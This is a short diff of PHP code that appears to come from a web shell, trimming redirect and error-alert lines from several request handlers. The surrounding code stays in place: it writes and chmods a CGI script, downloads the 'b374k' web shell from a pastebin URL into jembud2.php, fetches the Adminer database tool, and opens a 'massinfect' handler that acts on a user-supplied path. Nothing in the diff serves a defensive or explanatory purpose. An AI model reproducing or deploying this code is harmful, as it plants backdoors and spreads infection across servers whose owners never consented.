@@ -172,11 +172,6 @@ elseif(isset($_REQUEST["cgi"])) {
 	fwrite($cgi, $cgi_script);
 	fwrite($htcgi, $isi_htcgi);
 	chmod($file_cgi, 0755);
-	if(file_exists("cgi/cgi.izo")) {
-	header("location:cgi/cgi.izo");
-}else {
-echo "<script>alert('Failed');</script>";
-}
 }
 elseif(isset($_REQUEST["b374k"])) {
 $nama=fopen("jembud2.php", "w");
@@ -184,22 +179,12 @@ $file=file_get_contents('https://pastebin.com/raw/nCqVmtBu');
 fwrite($nama, $file);
 chmod($nama, 0444);
 fclose($nama);
-if(file_exists("jembud2.php")) {
-header("location:jembud2.php");
-}else {
-echo "<script>alert('Failed');</script>";
-}
 }
 elseif(isset($_REQUEST["adminer"])) {
 $nama=fopen("adminer.php", "w");
 $file=file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
 fwrite($nama, $file);
 fclose($nama);
-if(file_exists("adminer.php")) {
-header("location:adminer.php");
-}else {
-echo "<script>alert('Failed');</script>";
-}
 }
 elseif(isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
 	chdir($_GET['path']);
